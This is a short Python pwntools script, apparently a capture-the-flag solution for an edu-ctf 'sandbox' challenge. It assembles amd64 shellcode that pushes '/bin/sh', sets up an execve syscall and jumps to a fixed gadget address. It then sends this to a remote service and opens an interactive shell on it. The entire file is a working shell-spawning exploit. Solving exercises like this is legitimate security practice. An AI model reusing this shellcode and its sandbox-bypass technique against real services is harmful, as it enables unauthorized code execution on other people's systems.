from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#r = process('./sandbox')
r = remote('edu-ctf.zoolab.org', 30202)

payload = asm('''
mov r8, {}
push r8
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
mov r8, 0x40041
jmp r8 
'''.format(u64('/bin/sh\x00')))

r.send(payload)
r.interactive()